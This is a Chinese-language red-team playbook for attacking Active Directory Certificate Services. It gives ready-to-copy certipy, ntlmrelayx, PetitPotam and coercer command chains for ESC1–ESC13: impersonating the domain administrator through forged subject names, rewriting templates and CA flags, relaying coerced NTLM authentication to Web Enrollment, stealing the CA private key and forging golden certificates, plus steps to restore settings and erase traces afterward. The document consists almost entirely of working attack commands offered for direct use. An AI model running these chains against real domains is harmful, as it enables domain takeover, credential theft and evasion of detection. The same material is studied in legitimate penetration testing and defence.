# ADCS 证书攻击

AD CS(Active Directory Certificate Services)是企业 PKI 的心脏:一张"合法签发"的客户端认证证书就是一张免密码通行证,可直接换 Kerberos 票据、NT 哈希,横穿 LDAP / WinRM / RDP。本文件覆盖 certipy 远程枚举、ESC1–ESC8 全套路、NTLM 中继打 Web Enrollment、CA 私钥伪造黄金证书与证书落地使用。本文件命令均可直接复制,占位符用尖括号标注(如 `<域名>` `<DC的IP>` `<CA的IP>`,`<CA名>` 形如 `CORP-CA`)。

本文件工具:certipy(pipx v5.1.0)、impacket 套件(ntlmrelayx)、PetitPotam(~/tools/src/PetitPotam)、coercer、evil-winrm

---

## certipy find — 远程枚举 CA 与易受攻击的证书模板

来源:pipx 包 `certipy` v5.1.0(~/.local/bin/certipy,已入 PATH;认证写法统一为 `-u '<用户>@<域名>' -p '<密码>'`)

```bash
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -json -output adcs   # 全量枚举 AD CS,只保留有漏洞的对象,输出 adcs.json
grep -oE '"ESC[0-9]+"' adcs.json | sort | uniq -c                                            # 统计命中了哪些 ESC 及次数
jq -r '."Certificate Templates" | to_entries[] | select(.value["[!] Vulnerabilities"]) | .key' adcs.json   # 直接列出所有易受攻击的模板名
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout   # 文本模式直接在终端看(带 [!] Vulnerabilities 原因说明)
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -enabled -vulnerable   # 只看已发布到 CA 的模板(-enabled,避免误报未发布模板)
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -dc-only                # 隐蔽模式:只查 DC 的 LDAP,不碰 CA 机器(无 Web Enrollment 检测)
certipy parse -vulnerable -json -output offline adcs_export.reg   # 离线模式:解析目标机导出的注册表(.reg/BOF 输出),无域连接时用
```

参数速查:

- `-vulnerable`:只输出基于嵌套组成员判定有漏洞的对象(文本里每条带 `[!] Vulnerabilities` 与 ESC 编号+原因)
- `-json` / `-csv` / `-stdout` / `-output <前缀>`:JSON 最适合 jq 后处理;`-stdout` 适合快速人读
- `-enabled`:只列已发布到 CA 的模板(没发布的模板申请不到证书,不算可利用)
- `-dc-only`:只从 DC 收集,不与 CA 机器交互(流量最小)
- `-u '<用户>@<域名>' -p '<密码>'`:任意普通域账号即可;`-hashes :<NT哈希>` 传哈希,`-k` 走 Kerberos
- `-dc-ip <IP>`:DNS 不可靠时必加
- certipy v5.1 检测范围不止 ESC1–ESC8,还包括 ESC9/10/11/13/15/17(CVE-2024-49019 等),`grep 'ESC'` 全能抓到

注意: `find` 会同时输出 CA 配置(`Certificate Authorities` 键,含 ESC6/ESC7/ESC8/ESC11 判定)与模板配置(`Certificate Templates` 键,含 ESC1–4/9 等),两边都要看;无凭据时可先尝试匿名 LDAP,但绝大多数配置需要至少一个域账号才能读到。拿到 ESC 编号后,对照下文对应小节直接复制命令链。

## ESC1 — 模板允许申请者自填 SAN,可冒充任意用户

原理一句话:模板开了 `ENROLLEE_SUPPLIES_SUBJECT` 标志 + 客户端认证 EKU + 低权用户可注册,申请时自填 `administrator` 的 SAN 就是域管证书。

来源:Certified Pre-Owned(Will Schroeder / Lee Christel)经典模板配置缺陷;利用工具 certipy

```bash
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<模板名>' -upn 'administrator@<域名>'   # 申请证书,SAN 冒充域管,产出 administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书换凭据:输出 administrator 的 NT 哈希并保存 TGT(administrator.ccache)
KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass <DC主机名>.<域名>    # 用票据直接打 Kerberos 认证(psexec/wmiexec 通用)
nxc smb <DC的IP> -u administrator -H '<上一步输出的NT哈希>' --shares    # 或用 NT 哈希走 pass-the-hash 验证战果
```

参数速查(certipy req | certipy auth):

- `-ca '<CA名>'`:目标 CA 名(find 输出里找,如 `CORP-CA`),RPC/DCOM 申请必填
- `-template '<模板名>'`:目标模板(find 标 ESC1 的那个)
- `-upn '<SAN>'`:冒充对象的 UPN(用户);`-dns '<SAN>'`:冒充主机(打机器账户);`-sid '<SID>'`:直接塞对象 SID(域管 SID 最稳)
- `-out <文件>`:自定义输出文件名,默认按冒充对象命名(如 administrator.pfx)
- `-web` / `-dcom`:切换申请协议(默认 RPC):Web Enrollment(`-web`,ESC8 面同款端口)或 DCOM
- auth `-pfx <文件>`:证书文件;输出 NT 哈希 + ccache;`-kirbi` 改存 Rubeus 格式 kirbi
- auth `-ldap-shell`:不换哈希,直接 Schannel 连 LDAPS 进交互 shell

注意: req 默认输出的 PFX 无密码(可用 `-pfx-password` 设置);`certipy auth` 走 PKINIT,要求证书 EKU 含客户端认证(1.3.6.1.5.5.7.3.2)且链到域信任的 CA;冒充机器账户用 `-dns`,拿机器哈希后可接 RBCD/资源约束委派(见 05 文档)。

## ESC2 — 模板 EKU 为 Any Purpose 或无 EKU,万能证书

原理一句话:`Any Purpose` EKU(2.5.29.37.0)或干脆没有 EKU 的模板,签出来什么都能干——既能客户端认证冒充他人,也能当 ESC3 的注册代理。

来源:同 ESC1(模板 EKU 配置缺陷);利用工具 certipy

```bash
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<任意用途模板名>' -upn 'administrator@<域名>'   # 与 ESC1 完全同型:自填 SAN 冒充域管
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
# 另一条路:把 Any Purpose 证书当 ESC3 的 Certificate Request Agent 用(见 ESC3 第二步命令链)
```

参数速查:

- 与 ESC1 完全一致(`-ca` / `-template` / `-upn` / `-dns` / `-sid`)
- `-application-policies 'Client Authentication'`:申请时显式指定应用策略 OID,某些只查应用策略不查 EKU 的场景可用

注意: ESC2 模板若没开 `ENROLLEE_SUPPLIES_SUBJECT` 则不能自填 SAN,此时证书只能"以自己身份"申请——价值在于 Any Purpose 可当 Request Agent 走 ESC3 链,或者配合 `-application-policies` 补客户端认证用途;find 输出会明确标注该模板属于哪种组合。

## ESC3 — Certificate Request Agent 模板,代理任意用户申请证书

原理一句话:模板 EKU 是 `Certificate Request Agent`(1.3.6.1.4.1.311.10.3.10),持证者可以"代表"其他任何用户再申请一张真正的客户端认证证书。

来源:同 ESC1(注册代理 EKU 滥用);利用工具 certipy

```bash
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<RequestAgent模板名>'   # 第一步:拿到注册代理证书,产出 <用户>.pfx
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<客户端认证模板名如User>' -on-behalf-of '<域名>\administrator' -pfx '<用户>.pfx'   # 第二步:代理域管申请,产出 administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
```

参数速查:

- `-on-behalf-of '<域名>\<账户>'`:被代理对象(链路上的"受害者"),配合 `-pfx` 提供代理证书
- `-pfx <文件>`:第一步拿到的 Request Agent 证书;`-pfx-password` 若第一步设了密码
- 第二步模板选普通客户端认证模板(`User` / `Administrator` 等),不是 Request Agent 模板

注意: 现代版本 Windows 默认模板 `Exchange Enrollment Agent` 已不受信任,ESC3 多出现在自建模板;两步必须同一个 CA;老版本要求 `EnrollmentAgent` 证书模板在 NTAuth 存储受信任,实战以 find 判定为准。

## ESC4 — 模板对象 ACL 可写,直接改成 ESC1

原理一句话:普通用户对模板 AD 对象有 FullControl/WriteDacl/WriteProperty 权限,可改模板配置,把自己能注册的任意模板改成"允许自填 SAN"的 ESC1 形态。

来源:同 ESC1(模板 ACL 配置缺陷);利用工具 certipy template

```bash
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -save-configuration old_config.json   # 第一步:备份原配置(留作恢复,默认也会自动保存)
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-default-configuration   # 第二步:写入 certipy 预置的 ESC1 配置(Authenticated Users 可注册+可自填 SAN)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<可写模板名>' -upn 'administrator@<域名>'   # 第三步:按 ESC1 姿势申请域管证书
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-configuration old_config.json   # 第四步(收尾):恢复原配置抹掉改动痕迹
```

参数速查(certipy template):

- `-template '<模板名>'`:目标模板(大小写敏感)
- `-save-configuration <文件>`:把当前配置导出为 JSON(修改前的快照)
- `-write-default-configuration [SID]`:一键写入 ESC1 配置;可选参数指定受益 SID(默认 S-1-5-11 Authenticated Users——别填不归自己控制的 SID,否则失去恢复能力)
- `-write-configuration <json>`:从 JSON 恢复/写入配置
- `-force`:跳过交互确认

注意: 改配置是可检测、可逆但留痕的动作(目录服务事件 5136 记录 attribute 修改),打完务必用备份 JSON 恢复;模板名大小写敏感,find 输出里原名复制。

## ESC5 — PKI 相关 AD 对象 ACL 可写(CA 对象/容器/模板容器)

原理一句话:对 CA 服务器 AD 对象(`pKIEnrollmentService`)、OID 容器等 PKI 基础对象的危险写权限,可以把危险模板"发布"到 CA 上、改 CA 属性,等价于间接控制整个证书体系。

来源:同 ESC1(PKI 容器 ACL 缺陷);利用工具 certipy ca、dacledit

```bash
impacket-dacledit -action read '<域名>'/'<用户>':'<密码>'@<域名> -dc-ip <DC的IP> -target-dn 'CN=<CA名>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=<域>,DC=<域>'   # 先确认对 CA 对象的真实写权限(继承链)
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -list-templates    # 列出当前发布在 CA 上的模板
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -enable-template '<ESC1模板名>'   # 把一个"配置危险但未发布"的模板挂上 CA,随后按 ESC1 申请
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<ESC1模板名>' -upn 'administrator@<域名>'   # 接 ESC1 命令链拿域管证书
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
```

参数速查(certipy ca 部分,完整见"certipy ca -backup"小节):

- `-list-templates`:列出 CA 已发布的模板
- `-enable-template` / `-disable-template '<模板名>'`:发布/下架模板(需要 Manage CA 权限或对 CA 对象的写权限)
- `-ca '<CA名>'`:目标 CA

注意: ESC5 是"权限面"而非单一攻击路径:对模板容器(可建新模板)、OID 容器、NTAuth 容器(可植入恶意 CA)的写权各有不同玩法,find 会标注对象;本节给出的是最常用的"发布模板"链。用 `nxc ldap --bloodhound` 或 BloodHound 图谱核对 ACL 归属更稳。

## ESC6 — CA 标志 EDITF_ATTRIBUTESUBJECTALTSTATUS2,任意模板可塞 SAN

原理一句话:CA 服务端开了 `EDITF_ATTRIBUTESUBJECTALTSTATUS2` 标志后,即使模板不允许自填 SAN,申请者也能在请求里塞任意 SAN——任何你能注册的普通 User 模板瞬间变 ESC1。

来源:同 ESC1(CA 注册表标志缺陷);利用工具 certipy

```bash
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout | grep -A2 'ESC6'    # 确认 CA 配置里命中 ESC6(在 Certificate Authorities 段)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template 'User' -upn 'administrator@<域名>'   # 普通模板 + 自填 SAN 即可冒充域管
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
```

参数速查:

- 与 ESC1 完全一致;区别是 `-template` 随便挑自己能注册的(默认 User),SAN 是"越权"塞进去的

注意: 2022 年 5 月补丁后 Windows 默认拒绝这种行为(ESC6 被缓解),老系统/未打补丁环境仍有效;ESC6 判定挂在 CA 而不是模板上,find 时看 `Certificate Authorities` 段的 `[!] Vulnerabilities`;与 ESC1 叠加时,中继场景下 ntlmrelayx 用 `--altname` 参数塞 SAN(见 ESC8)。

## ESC7 — 对 CA 本体有 Manage CA / Manage Certificates 权限

原理一句话:`Manage CA` 可自封 Certificate Officer 并给任意挂起请求发证,`Manage Certificates` 可直接审批申请——用"需审批"的高权模板走 提交→自批→取回 三步拿域管证书,或者更进一步 `-backup` 抽走 CA 私钥铸黄金证书。

来源:同 ESC1(CA 角色权限缺陷);利用工具 certipy ca

```bash
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -add-officer '<用户>'    # 第一步:Manage CA 权限自封 Officer(可审批证书)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<需审批的域管模板>' -upn 'administrator@<域名>'   # 第二步:提交申请,状态挂起,记下输出里的 Request ID
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -issue-request <请求ID>   # 第三步:Officer 审批自己的请求
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<需审批的域管模板>' -retrieve <请求ID> -upn 'administrator@<域名>'   # 第四步:取回证书 administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -backup    # 顶配路径:直接备份 CA 证书+私钥(见"伪造黄金证书"小节)
```

参数速查(certipy ca):

- `-add-officer '<用户>'` / `-add-manager '<用户>'`:给自己加 Certificate Officer(审批权)/ CA Manager;`-remove-officer` / `-remove-manager` 反向移除
- `-issue-request <请求ID>` / `-deny-request <请求ID>`:审批/驳回挂起的申请
- `-retrieve` 在 certipy req 侧:按 Request ID 取回已签发证书
- `-config '<CA主机名>\<CA名>'`:直接指定 CA 配置串(绕过 LDAP 定位)

注意: 第二步若模板不需要审批会直接发证,那就不需要审批三步,直接 auth;`-add-officer` 需要 Manage CA,`-issue-request` 需要 Manage Certificates,find 会分别标注;Officer 变更和审批动作都在 CA 审计日志(4887/4898 事件)里,高敏环境动作要快。

## ESC8 — NTLM 中继到 CA Web Enrollment(HTTP 接口无防护)

原理一句话:CA 的 Web Enrollment(`/certsrv/certfnsh.asp`)走 HTTP 且不强制预认证、不支持信道绑定,机器/用户的 NTLM 认证被原样中继过去即可替受害者申请证书——不需要任何凭据,只需要"逼"一台机器向我们发起认证。

来源:ntlmrelayx 为 apt 包 `python3-impacket`(/usr/bin/impacket-ntlmrelayx);PetitPotam 为本机源码 ~/tools/src/PetitPotam(实际脚本小写 `petitpotam.py`,已实测);coercer 为 pipx 包(coercer v2.4.3)

### 第一步:起中继服务器(终端 1)

```bash
sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --template DomainController    # 经典写法:中继到 CA Web Enrollment,替被中继账户按 DC 模板签证书
sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --adcs --template Computer    # 等价新写法:--adcs 显式开启 AD CS 攻击模式,默认按账户名结尾 $ 选 Machine/User
sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --adcs --template '<ESC1模板名>' --altname 'administrator@<域名>'    # 目标模板本身允许自填 SAN 时(ESC1/ESC6 组合),中继+塞 SAN 一步拿域管证书
```

### 第二步:触发认证(终端 2,任选一个强制源)

```bash
python3 ~/tools/src/PetitPotam/petitpotam.py -dc-ip <DC的IP> '<域名>/<用户>:<密码>@<目标主机IP>' '\\<本机IP>\share'    # PetitPotam(MS-EFSR):逼 <目标主机IP> 向本机发起 SMB 认证(打 DC 时目标就是域控)
sudo coercer coerce --auth-type smb -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'    # coercer 全方法扫射:二十余种协议强制认证,任一命中即触发中继
sudo coercer coerce --auth-type http -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'    # coercer 走 HTTP 认证触发(需 ntlmrelayx 的 HTTP 端口收流,默认 80)
sudo coercer scan -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'    # 先用 scan 模式探测目标哪些强制方法可用,再精确 coerce
```

### 第三步:证书落地

```bash
certipy auth -pfx <中继输出文件如DC主机名>.pfx -dc-ip <DC的IP>    # 中继拿到 PFX 后立刻换 NT 哈希 + TGT(DC 证书=域控机器账户哈希)
nxc smb <DC的IP> -u '<DC主机名>$' -H '<机器NT哈希>' --shares    # 机器哈希验证;接 DCSync 尝试或 RBCD 链
```

参数速查(ntlmrelayx | PetitPotam | coercer):

- ntlmrelayx `-t http://<CA>/certsrv/certfnsh.asp`:中继终点固定写 certfnsh.asp(Web Enrollment 提交端点)
- ntlmrelayx `-smb2support`:接受 SMB2 认证接入(现代 Windows 必加)
- ntlmrelayx `--adcs`:启用 AD CS 专项逻辑;`--template <模板名>`:指定申请模板(DC 用 DomainController,机器用 Computer/Machine,用户用 User;不指定则按账户名是否带 $ 自动选)
- ntlmrelayx `--altname '<SAN>'`:ESC1/ESC6 场景下塞 Subject Alternative Name
- ntlmrelayx `--http-port <端口>` / `--smb-port <端口>`:自定义接入监听端口(coercer `--smb-port/--http-port` 与之对齐)
- PetitPotam 位置参数:`[[域名/]用户[:密码]@]<目标>` + `<UNC路径>`(本机版本认证写在 target 串里,路径写 `\\<本机IP>\任意共享名`)
- PetitPotam `-pipe lsarpc` / `-method <方法>`:切换触发用的命名管道/RPC 方法(默认 lsarpc,被拦时换)
- coercer `-t <目标>` / `-f <目标清单文件>`:单目标/批量;`-l <本机IP>`:认证回收地址(必填)
- coercer `--auth-type smb|http`:强制出的认证类型;`--filter-method-name <名>`:只测指定方法

注意: 中继要求触发源到本机、本机到 CA 双向可达,且 CA 开了 HTTP Web Enrollment(`certipy find` 会标 ESC8);`-smb2support` 收 SMB 流要 root;打域控拿 DomainController 模板证书后,`certipy auth` 得到的是域控机器账户 KRBTGT 级能力的起点(可尝试 DCSync);coercer 的 `coerce` 模式动静大(全方法尝试),红队优先 `scan` 探明再单点触发;mitm6(`-6`)同样能喂认证给这套中继(见 05 文档)。

## ESC10 — 弱证书映射(DC 注册表弱配置,UPN 无 SAN 证书照常映射)

原理一句话:DC 侧证书映射弱化——`StrongCertificateBindingEnforcement=0`(PKINIT 不再强制 SID 强绑定)或 `CertificateMappingMethods` 勾选 UPN 位(Schannel 按 UPN 弱映射)——一张只带受害者 UPN、没有 SAN/objectSID 强绑定的证书就能认证成任意账户。

来源:Certipy wiki ESC10(注册表层弱映射,非模板缺陷);利用工具 certipy(注册表远程核对用 nxc)

```bash
nxc smb <DC的IP> -u '<用户>' -p '<密码>' -x 'reg query HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters /v StrongCertificateBindingEnforcement'    # 第一步:核对 Kerberos 强绑定开关(0=可利用;键不存在默认 1,2 为全强映射)
nxc smb <DC的IP> -u '<用户>' -p '<密码>' -x 'reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v CertificateMappingMethods'    # 核对 Schannel 映射方式:勾选了 UPN 映射位即弱映射(默认配置不含 UPN 位)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<ESC1模板名>' -upn 'administrator@<域名>'   # 第二步:申请只带受害者 UPN 的证书(能自填 UPN 的 ESC1 模板最直接;弱映射下无需 SAN/objectSID)
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 第三步 A(StrongCertificateBindingEnforcement=0):PKINIT 弱映射照常换 NT 哈希 + TGT
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <DC的IP>    # 第三步 B(CertificateMappingMethods 含 UPN 位):Schannel 按 UPN 直接映射进 LDAPS 交互 shell
```

参数速查:

- `-upn 'administrator@<域名>'`:受害者 UPN 写进证书;此处刻意不用 `-dns`/`-sid`,弱映射吃的就是"裸 UPN"
- auth `-ldap-shell`:Schannel 映射路线;`-username '<账户>' -domain '<域名>'` 可在证书身份不明确时显式指定映射目标
- nxc `-x '<cmd命令>'`:目标机远程执行(查注册表需本地管理员权限,常来自横向战果/已有 shell)
- 两条注册表任一弱化即可利用:Kerberos 侧 `HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters`,Schannel 侧 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`

注意: certipy find(v5.1.0)不会自动检测 ESC10——弱映射是 DC 本地注册表配置,不在 LDAP 枚举范围(本机 certipy 源码 find.py 无 ESC10 判定逻辑),必须手工核对;ESC10 常与 ESC1/ESC9 叠加(模板允许塞 UPN / 无安全扩展,弱映射兜底放行);2022-05 补丁(KB5014754)引入证书强绑定后,注册表值显式置 0 或长期未管控的老系统才可利用。

## certipy relay — ESC8/ESC11 一体化中继(免 ntlmrelayx)

来源:pipx 包 `certipy` v5.1.0(监听 445 需要 sudo)

```bash
sudo certipy relay -target http://<CA的IP> -template DomainController    # ESC8 一体化:自己监听 445 收认证,中继到 CA Web Enrollment,直接产出 PFX
sudo certipy relay -target http://<CA的IP> -template '<ESC1模板名>' -upn 'administrator@<域名>'    # 目标模板允许自填 SAN 时,中继+冒充一步到位
sudo certipy relay -target rpc://<CA的IP> -ca '<CA名>' -template DomainController    # ESC11:中继到 CA 的 ICPR 接口(RPC 签名未强制时)
sudo certipy relay -target http://<CA的IP> -forever -no-skip    # 连续收割:不因首个成功停止,不跳过已打过的账户
certipy auth -pfx <输出的PFX> -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
```

参数速查:

- `-target protocol://<IP>`:`http://` = ESC8(Web Enrollment),`rpc://` = ESC11(ICPR,必须配 `-ca`)
- `-template '<模板名>'`:不指定则按被中继账户名是否以 `$` 结尾自动选 Machine/User;打 DC 必须显式 `DomainController`
- `-upn` / `-dns` / `-sid`:中继申请时塞 SAN(模板允许时)
- `-interface <IP>` / `-port <端口>`:监听地址与端口(默认 0.0.0.0:445)
- `-forever` / `-no-skip`:持续中继 + 不跳过已攻击账户(组合收割)
- `-enum-templates`:中继到 /certsrv/certrqxt.asp 枚举可用模板(侦察)

注意: certipy relay 与 ntlmrelayx 二选一即可,前者少一层进程、自动处理证书落地;触发源(PetitPotam/coercer/mitm6)完全复用 ESC8 第二步的命令;ESC11 要求 CA 未强制 RPC 签名(注册表 `InterfaceFlags` 未设 ENFORCEENCRYPTEDCERTREQUEST,find 会标)。

## ESC12 — PKI 管理级访问(模板写 ACL / CA 服务器 shell,直接改出 ESC1/ESC6)

原理一句话:攻击者握有 PKI 管理面——对模板对象的可写 ACL 或 CA 服务器的管理 shell——不再依赖具体配置缺陷,直接把可注册模板改成 ESC1 形态,或在 CA 本地一键打开 ESC6 标志。

来源:Certipy wiki ESC12(管理级访问的降维利用);利用工具 certipy template(远程改模板)、certutil(CA 本地改配置)

```bash
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -save-configuration old_config.json   # 路线一(远程,有模板写 ACL):先备份原配置
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-default-configuration   # 写入 certipy 预置 ESC1 配置(Authenticated Users 可注册 + 可自填 SAN)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<可写模板名>' -upn 'administrator@<域名>'   # 按 ESC1 姿势拿域管证书
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>    # 证书 → NT 哈希 + TGT
# 路线二(CA 服务器本地管理 shell):certutil 直改 CA 注册表,一步到 ESC6 形态
certutil -setreg policy\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy EditFlags +EDITF_ATTRIBUTESUBJECTALTSTATUS2   # 打开"申请者可塞 SAN"标志(等价 ESC6)
net stop certsvc && net start certsvc   # 重启 CA 服务生效(数秒服务中断,监控可见)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template 'User' -upn 'administrator@<域名>'   # 回到远程:任意普通模板即可冒充域管(与 ESC6 同型)
```

参数速查:

- certipy template 四件套:`-template` / `-save-configuration` / `-write-default-configuration [SID]` / `-write-configuration <json>`(与 ESC4 同一套,细节见 ESC4)
- certutil `-setreg policy\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy EditFlags +EDITF_ATTRIBUTESUBJECTALTSTATUS2`:置位 ESC6 标志;收尾还原把 `+` 换成 `-` 再执行一次
- `net stop certsvc && net start certsvc`:改注册表后必须重启 CA 服务才生效
- certipy ca `-enable-template '<模板名>'`:远程备选——把"配置危险但未发布"的模板挂上 CA(需 Manage CA,见 ESC5)

注意: certipy find(v5.1.0)不会给出 ESC12 判定——它不是单一配置缺陷而是"已有管理访问"的利用面(本机 certipy 源码 find.py 无 ESC12 逻辑),入口靠 ESC4/ESC5/ESC7 判定或 BloodHound ACL 图谱;certutil 改标志 + 重启 certsvc 高噪(服务中断、5136 属性修改审计),撤离前务必还原:模板按备份 JSON 恢复、注册表标志减回、再重启服务;与 ESC4/ESC5 的边界:那是"低权用户误得写权限"的漏洞,ESC12 是 PKI 管理员/CA 本地管理员/CA Admins 组成员的正统打法,常见于已拿下 CA 服务器之后。

## ESC13 — 颁发策略链接高权限组(msPKI-Certificate-Policy → msDS-OIDToGroupLink)

原理一句话:模板带客户端认证 EKU,其 `msPKI-Certificate-Policy` 引用的颁发策略 OID 在 OID 容器里通过 `msDS-OIDToGroupLink` 挂在高权限组上——按该模板签出的证书在认证瞬间让持有者"临时入组",以自己身份申请即继承组权限。

来源:Certipy wiki ESC13(颁发策略组映射滥用);利用工具 certipy(find 可自动判定)

```bash
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout | grep -A2 'ESC13'    # 第一步:find 自动判定,读出模板与链接的高权限组名(Linked Groups)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<ESC13模板名>'   # 第二步:以自己身份正常申请(不需要 -upn 冒充),产出 <用户>.pfx,证书自动带颁发策略 OID
certipy auth -pfx <用户>.pfx -dc-ip <DC的IP>    # 第三步:认证即临时加入链接组,票据带该组 SID——按组权限直接行动(DCSync/LAPS 读取/GPO 改,看组实际能力)
# ACE 滥用变体:对模板 msPKI-Certificate-Policy 属性有写权时,把任意可注册模板"嫁接"到高权限组的策略上
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -save-configuration tpl.json   # 导出模板当前配置 JSON(全部属性原样导出)
# 手工编辑 tpl.json:把 msPKI-Certificate-Policy 改为 find 里已链接高权限组的颁发策略 OID(形如 1.3.6.1.4.1.311.10.3.x)
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-configuration tpl.json   # 写回后按上面 req → auth 链走(打完按备份恢复)
```

参数速查:

- `-template '<ESC13模板名>'`:find 标 ESC13 的那个;不需要 `-upn`/`-dns`/`-sid`——身份是自己,权限全来自颁发策略
- find 输出读法:`Certificate Templates` 段 `[!] Vulnerabilities: ESC13` 会直接写出链接组名;OID 对象侧还会标"颁发策略 OID 归你所有/有危险权限"(可顺手改 msDS-OIDToGroupLink 指向自己可控的组)
- template `-save-configuration` / `-write-configuration`:变体写 msPKI-Certificate-Policy 用(JSON 按属性名完整往返,原值保留在备份里)
- auth 后验证:票据里已含链接组 SID,直接执行该组允许的高权动作即为验证(不必等组成员列表刷新)

注意: ESC13 是本机 certipy v5.1.0 能自动检测的判定(源码 find.py 逻辑:客户端认证 EKU + msPKI-Certificate-Policy + 链接组,输出 Linked Groups);组授予是动态的——证书认证时才"带组",吊销/过期即失效,目录里不留静态组成员痕迹;威力取决于链接组的实际权限,拿证后先 BloodHound 查该组可达路径;变体写法要求对模板属性有写权,find 会同时标 ESC4,两条判定叠加时优先走本节链(不改 SAN、不用冒充,更干净)。

## certipy forge — 伪造黄金证书与自签 CA

原理一句话:拿到 CA 证书+私钥(ESC7 `-backup`、CA 服务器本地导出、DCSync 后离线提取)即可离线签发任意身份的"黄金证书"——不碰 CA、不留申请记录,与黄金票据同级。

来源:pipx 包 `certipy` v5.1.0;CA 私钥获取依赖 certipy ca -backup

```bash
certipy ca -u '<CA管用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -backup    # 第一步:从 CA 备份证书+私钥,产出 <CA名>.pfx(默认密码与 CA 机器账户相关,见输出)
certipy forge -ca-pfx <CA名>.pfx -ca-password '<CA的pfx密码>' -upn 'administrator@<域名>' -subject 'CN=Administrator,CN=Users,DC=<域>,DC=<域>' -out golden.pfx   # 第二步:离线签发"administrator"黄金证书
certipy auth -pfx golden.pfx -dc-ip <DC的IP>    # 第三步:黄金证书 → NT 哈希 + TGT,AD CS 全程无申请日志
certipy forge -upn 'anyuser@<域名>' -out rogue.pfx    # 无 CA 私钥时:生成自签根 CA + 终端证书(独立信任链,用于恶意 CA 植入/钓鱼场景,域内默认不受信)
certipy forge -ca-pfx <CA名>.pfx -subject 'CN=Administrator,CN=Users,DC=<域>,DC=<域>' -sid '<域管SID如S-1-5-21-...-500>' -out golden_sid.pfx    # UPN 不确定时直接塞对象 SID,认证端按 SID 映射身份
```

参数速查:

- `-ca-pfx <文件>` / `-ca-password '<密码>'`:CA 证书与私钥(缺省则生成全新自签根 CA)
